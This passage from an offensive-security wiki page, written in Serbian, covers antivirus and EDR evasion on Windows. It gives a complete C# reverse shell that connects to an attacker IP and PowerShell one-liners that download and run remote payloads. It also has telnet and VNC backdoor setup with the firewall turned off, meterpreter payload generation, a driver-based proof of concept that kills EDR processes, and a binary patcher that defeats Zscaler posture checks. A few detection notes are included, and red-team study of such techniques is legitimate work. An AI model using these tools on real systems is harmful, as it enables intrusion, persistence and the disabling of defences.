- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork LLVM kompajlerskog paketa koji pruža veću bezbednost softvera pomoću [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako se jezik `C++11/14` može koristiti za generisanje obfuskovanog koda u vreme kompajliranja, bez korišćenja eksternih alata i bez izmena kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih pomoću C++ template metaprogramming framework-a, što osobi koja želi da crack-uje aplikaciju otežava posao.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuskuje različite PE fajlove, uključujući .exe, .dll i .sys fajlove.
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne izvršne fajlove.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za fino-grain obfuskaciju koda za jezike koje podržava LLVM, a koristi ROP (return-oriented programming). ROPfuscator obfuskuje program na nivou assembly koda tako što obične instrukcije pretvara u ROP chain-ove, narušavajući našu uobičajenu predstavu o normalnom toku kontrole.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nim-u.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeći EXE/DLL u shellcode i zatim da ga učita.

### LLVM compiler-assisted per-function self-masking

Umesto da maskira ceo implant samo dok miruje, izmenjeni LLVM X86 backend može da drži izabrane funkcije XOR-maskirane kad god nisu aktivne. Function Peekaboo PoC bira demanglovana imena koja sadrže `REG_`, ubacuje position-independent entry/exit stub-ove oko konačnog mašinskog koda i emituje jedan zajednički masking handler u `.text`; potpisi na nivou izvornog koda i Windows x64 calling convention ostaju nepromenjeni.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Ova transformacija treba da se izvrši nakon odabira instrukcija i optimizacije, jer mora da obuhvati **svaki emitovani return** i da zna tačan x86 raspored. `MachineFunctionPass` koji se izvršava pre emitovanja pronalazi poslednji `MachineInstr::isReturn()`, briše ga kako bi se poslednja putanja nastavila u dodati epilogue i zamenjuje ranije return-ove sa `JMP_1 handler`. Zadržite svako teardown operacije steka/frame-a koje je kompajler generisao pre return-a; preusmerite samo samu return instrukciju.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emituju stub-ove za svaku funkciju, dok `emitEndOfAsmFile()` emituje handler. Simboli koji se dele između faza emitovanja omogućavaju prologue grani da cilja kasniji epilogue; za ručno emitovan near `je`, upišite `0F 84`, a zatim četvorobajtni MC izraz `target - address_after_je`. Pozivi i skokovi ka handler-u mogu se umesto toga emitovati kao `MCInst` objekti (`CALL64pcrel32` i `JMP_1`). Pass mora da vrati `false` za funkciju koja nije izabrana, ako nije ništa izmenio; PoC pogrešno vraća `true` u tom slučaju.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC smešta XOR ključ i zapise od 16 bajtova koji sadrže loader-relocated pokazivač na funkciju i dužinu određenu u runtime-u u `.funcmeta`. Iako je C polje `uint32_t`, handler pristupa QWORD vrednosti na offset-u `+8` u zapisu, čime obuhvata dužinu i padding, a zapise obrađuje u koracima od `0x10`. Nazivi PE sekcija zauzimaju samo osam bajtova, pa runtime pretraga vidi `.funcmet`. Eksterni patcher dodaje izvršni `.stub`, čuva stari entry-point RVA u stub-u i preusmerava `AddressOfEntryPoint`; PIC stub dobija image base iz `gs:[0x60]` → `[PEB+0x10]`, prolazi kroz PE32+ imports da bi razrešio već importovani `VirtualProtect` i izvršava se pre CRT-a.<sup>[[38]](#references)[[39]](#references)</sup>

Inicijalizacija postavlja sentinel u `gs:[0xE8]` i poziva svaku funkciju iz metadata zapisa. Njena trajno čitljiva prologue sekcija upisuje početak funkcije u `gs:[0xF0]`, detektuje sentinel i preskače još uvek neizmenjeno telo funkcije. Epilogue zatim koristi `call handler`; nakon što handler sačuva 13 registara (`0x68` bajtova), povratna adresa na `[rsp+0x68]` predstavlja kraj transformisane funkcije, pa se `end - start` može upisati u njen metadata zapis. Stub briše sentinel i skače na `ImageBase + original_entry_point_RVA` nakon što su sva tela funkcija maskirana.<sup>[[38]](#references)[[39]](#references)</sup>

Tokom uobičajenog poziva, prologue poziva isti simetrični handler da bi dekodirao telo funkcije. Poslednja putanja nastavlja se u dodati epilogue, dok svaki raniji return skače direktno do zajedničkog handler-a. Uobičajeni epilogue takođe koristi `jmp handler` umesto `call`, pa nakon ponovnog maskiranja, `ret` iz handler-a koristi povratnu adresu originalnog pozivaoca i čuva rezultat funkcije u `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler pronalazi trenutni zapis, preskače fiksni vidljivi prologue (`0x46` bajtova u ovoj verziji), menja ostatak u `PAGE_EXECUTE_READWRITE`, XOR-uje ga bajt po bajt pomoću najnižeg bajta ključa, a zatim mu postavlja `PAGE_EXECUTE_READ`. Ista petlja zato dekodira pri ulasku i kodira pri svakom uobičajenom izlasku.<sup>[[38]](#references)[[39]](#references)</sup>

Indikatori sa visokom pouzdanošću za ovaj dizajn uključuju:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point unutar izvršnog `.stub`-a i `.funcmet` sekciju koja sadrži ključ i relocated pokazivače na `.text`;
- parsiranje PEB-a, import tabele i section tabele pre CRT-a, nakon čega slede pozivi preko svakog metadata pokazivača;
- identične `call`/`pop` PIC prologue sekcije i brojna return mesta preusmerena ka jednom handler-u;
- upise u `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, praćene ponovljenim `VirtualProtect` promenama i XOR upisima bajt po bajt u izvršne stranice koje pripadaju image-u.

Ovo je izbegavanje memory scanner-a, a ne kriptografska zaštita: patchovani fajl i dalje sadrži originalno, dešifrovano telo, a debugger može da postavi breakpoint na `VirtualProtect` ili XOR petlju i sačuva aktivnu funkciju. XOR nad jednim bajtom, čitljivi metadata podaci i fiksna granica `0x46` takođe olakšavaju offline oporavak.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slot-ovi u PoC-u su thread-local, ali izmenjene code pages važe za ceo proces. Zato istovremeni ili rekurzivni ulazak može ponovo da promeni instrukcije dok ih druga invokacija izvršava; izuzeci i nonlocal izlazi takođe mogu da zaobiđu ponovno maskiranje. Robusna implementacija mora da sinhronizuje promene, vrati zaštitu koja je zaista vraćena kroz `lpflOldProtect`, izbegne hard-coded dužine stub-a, proveri i `call` i `jmp` putanje za x64 poravnanje steka i pozove `FlushInstructionCache` nakon ponovnog upisa izvršnih bajtova. Microsoft izričito navodi da je pozivalac odgovoran za koherenciju instrukcionog keša kada se izvršni kod izmeni.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen i MoTW

Možda ste videli ovaj ekran prilikom preuzimanja nekih izvršnih fajlova sa interneta i njihovog pokretanja.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom koristi pristup zasnovan na reputaciji, što znači da će aplikacije koje se retko preuzimaju pokrenuti SmartScreen, koji će upozoriti krajnjeg korisnika i sprečiti ga da izvrši fajl (iako se fajl i dalje može izvršiti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) pod nazivom Zone.Identifier, koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kog je fajl preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani **pouzdanim** sertifikatom za potpisivanje **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payload-i dobiju Mark of The Web jeste da ih spakujete u neku vrstu kontejnera, kao što je ISO. To je zato što se Mark-of-the-Web (MOTW) **ne može** primeniti na **volumene koji nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Primer upotrebe:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-a u ISO datoteke pomoću alata [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za beleženje događaja u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **beleže događaje**. Međutim, bezbednosni proizvodi ga mogu koristiti i za nadgledanje i otkrivanje zlonamernih aktivnosti.

Slično tome kako se AMSI onemogućava (zaobilazi), moguće je i da funkcija **`EtwEventWrite`** procesa u korisničkom prostoru odmah vrati kontrolu bez beleženja događaja. To se postiže izmenom funkcije u memoriji tako da odmah vrati kontrolu, čime se efektivno onemogućava ETW beleženje za taj proces.

Više informacija možete pronaći na **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju poznato je već duže vreme i još uvek je odličan način za pokretanje post-exploitation alata bez otkrivanja od strane AV-a.

Pošto će payload biti učitan direktno u memoriju, bez upisivanja na disk, moraćemo da vodimo računa samo o patch-ovanju AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) već omogućava izvršavanje C# assemblies директно у меморији, али то се може урадити на различите начине:

- **Fork\&Run**

Овај метод подразумева **покретање новог жртвеног процеса**, убацивање нашег злонамерног post-exploitation кода у тај процес, његово извршавање и гашење новог процеса када се заврши. Овај приступ има предности и недостатке. Предност fork and run методе је у томе што се извршавање одвија **изван** процеса нашег Beacon импланта. То значи да постоји **много већа вероватноћа** да ће наш **имплант преживети** ако нешто пође наопако током post-exploitation активности или буде откривено. Недостатак је **већа вероватноћа** да ће вас ухватити **бихевиорална детекција**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Ради се о убацивању злонамерног post-exploitation кода **у сопствени процес**. Тако можете да избегнете креирање новог процеса и његово скенирање од стране AV-а, али недостатак је то што постоји **много већа вероватноћа** да ћете **изгубити beacon** ако нешто пође наопако при извршавању payload-а, јер процес може да се сруши.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ако желите да сазнате више о учитавању C# assemblies, погледајте овај чланак [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) и њихов InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assemblies можете учитати и **из PowerShell-а**; погледајте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) и [видео аутора S3cur3th1sSh1t-а](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Као што је предложено у [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), могуће је извршавати злонамерни код и помоћу других језика тако што се компромитованој машини омогући приступ **окружењу интерпретатора инсталираном на SMB share-у под контролом нападача**.

Омогућавањем приступа извршним датотекама интерпретатора и окружењу на SMB share-у можете **извршавати произвољан код на тим језицима у меморији** компромитоване машине.

У репозиторијуму се наводи: Defender и даље скенира скрипте, али коришћење Go, Java, PHP-а итд. пружа **већу флексибилност за заобилажење статичких сигнатура**. Тестирање насумичних, не-обфускованих reverse shell скрипти на овим језицима показало се успешним.

## TokenStomping

Token stomping мења access token безбедносног производа као што су EDR или AV. Смањење привилегија токена може омогућити да процес настави са радом, а да не може да обавља привилеговане провере или радње за отклањање претњи.

Да би се ово спречило, Windows би могао да **спречи спољне процесе** да добију handles за токене безбедносних процеса.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Као што је описано у [**овом блог посту**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), лако је инсталирати Chrome Remote Desktop на рачунар жртве, а затим га користити за преузимање контроле над њим и одржавање persistence-а:<sup>[[35]](#references)</sup>
1. Преузмите га са https://remotedesktop.google.com/, кликните на „Set up via SSH“, а затим кликните на MSI датотеку за Windows да бисте је преузели.
2. Покрените инсталатер тихо на рачунару жртве (потребне су администраторске привилегије): `msiexec /i chromeremotedesktophost.msi /qn`
3. Вратите се на страницу Chrome Remote Desktop-а и кликните на „Next“. Чаробњак ће затим затражити ауторизацију; кликните на дугме „Authorize“ да бисте наставили.
4. Извршите дату команду уз потребна прилагођавања: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметар `--pin` поставља PIN без коришћења GUI-ја).
 

## Advanced Evasion

Избегавање детекције је веома сложена тема. Понекад морате да узмете у обзир много различитих извора телеметрије у једном систему, па је практично немогуће остати потпуно неоткривен у зрелим окружењима.

Свако окружење на које наиђете имаће своје предности и слабости.

Снажно вам препоручујем да погледате ово предавање аутора [@ATTL4S](https://twitter.com/DaniLJ94) како бисте стекли почетни увид у напредније технике избегавања детекције.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ово је још једно сјајно предавање аутора [@mariuszbit](https://twitter.com/mariuszbit) о дубинском избегавању детекције.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Можете користити [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), који ће **уклањати делове бинарне датотеке** све док **не утврди који део Defender сматра злонамерним**, а затим вам га издвојити.\
Још један алат који ради **исто је** [**avred**](https://github.com/dobin/avred), уз веб-услугу доступну на [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows 10, сва издања Windows-а долазила су са **Telnet сервером** који сте могли да инсталирате (као администратор) на следећи начин:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Podesite da se **pokrene** pri pokretanju sistema i **pokrenite** ga sada:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Promenite telnet port** (stealth) i onemogućite firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebna su vam bin preuzimanja, ne instalaciona verzija)

**NA HOSTU**: Pokrenite _**winvnc.exe**_ i podesite server:

- Omogućite opciju _Disable TrayIcon_
- Podesite lozinku u _VNC Password_
- Podesite lozinku u _View-Only Password_

Zatim premestite binarnu datoteku _**winvnc.exe**_ i **novonastalu** datoteku _**UltraVNC.ini**_ na **žrtvu**

#### **Povratna veza**

**Napadač** treba da pokrene binarnu datoteku `vncviewer.exe -listen 5900` na svom **hostu** kako bi bila **spremna** da prihvati povratnu **VNC vezu**. Zatim, na **žrtvi**: Pokrenite winvnc daemon pomoću komande `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, ne smete da uradite nekoliko stvari:

- Nemojte pokretati `winvnc` ako je već pokrenut jer ćete izazvati [iskačući prozor](https://i.imgur.com/1SROTTl.png). Proverite da li je pokrenut pomoću `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez datoteke `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [prozor sa podešavanjima](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` radi pomoći jer ćete izazvati [iskačući prozor](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

U okviru GreatSCT-a:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sada **pokrenite listener** pomoću `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# reverse shell

Kompajlirajte ga pomoću:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Koristite ga sa:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# pomoću kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Spisak C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer korišćenja Python-a za pravljenje injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Gašenje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući zaštitu krajnjih tačaka pre isporučivanja ransomware-a. Alat donosi **sopstveni ranjivi, ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni AV servisi zaštićeni pomoću Protected-Process-Light (PPL) ne mogu da blokiraju.<sup>[[12]](#references)</sup>

Ključni zaključci
1. **Potpisani driver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs-ovog „System In-Depth Analysis Toolkit“. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prvi red registruje drajver kao **kernel servis**, a drugi ga pokreće, čime `\\.\ServiceMouse` postaje dostupan iz userland-a.
3. **IOCTL-ovi koje drajver izlaže**
   | IOCTL kod | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Prekinuti proizvoljan proces prema PID-u (koristi se za gašenje Defender/EDR servisa) |
   | `0x990000D0` | Obrisati proizvoljnu datoteku sa diska |
   | `0x990001D0` | Ukloniti drajver i izbrisati servis |

   Minimalni C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi zaštite u korisničkom režimu; kod koji se izvršava u kernelu može da otvara *zaštićene* procese, prekida ih ili menja objekte kernela, bez obzira na PPL/PP, ELAM ili druge funkcije za ojačavanje zaštite.

Detekcija / ublažavanje
•  Omogućite Microsoftovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) kako bi Windows odbio učitavanje datoteke `AToolsKrnl64.sys`.
•  Nadgledajte kreiranje novih *kernel* servisa i šaljite upozorenje kada se drajver učita iz direktorijuma u koji mogu da upisuju svi korisnici ili kada nije na listi dozvoljenih.
•  Pratite ručke iz korisničkog režima ka prilagođenim objektima uređaja, a zatim i sumnjive pozive funkcije `DeviceIoControl`.

### Zaobilaženje provera stanja uređaja u Zscaler Client Connector-u izmenom binarnih datoteka na disku

Zscalerov **Client Connector** lokalno primenjuje pravila za stanje uređaja i oslanja se na Windows RPC da bi rezultate preneo drugim komponentama. Dva slaba izbora u dizajnu omogućavaju potpuno zaobilaženje:

1. Provera stanja uređaja obavlja se **u potpunosti na strani klijenta** (serveru se šalje logička vrednost).
2. Interni RPC krajnji punktovi proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscaler-a** (pomoću `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Izmenom četiri potpisane binarne datoteke na disku** oba mehanizma mogu da se neutrališu:

| Binarna datoteka | Izmenjena originalna logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa je svaka provera usklađena |
| `ZSAService.exe` | Indirektni poziv funkcije `WinVerifyTrust` | Zamenjen NOP instrukcijama ⇒ bilo koji proces, čak i nepotpisan, može da se poveže sa RPC cevima |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Preskočene |

Minimalni isečak patcher-a:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih datoteka i ponovnog pokretanja steka usluga:

* **Sve** provere bezbednosnog stanja prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke sa imenovanim cevovodom (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju donete isključivo na klijentskoj strani i jednostavne provere potpisa mogu zaobići uz nekoliko izmena bajtova.

## Zloupotreba pouzdane funkcionalnosti Microsoft Defender `BTR.sys`

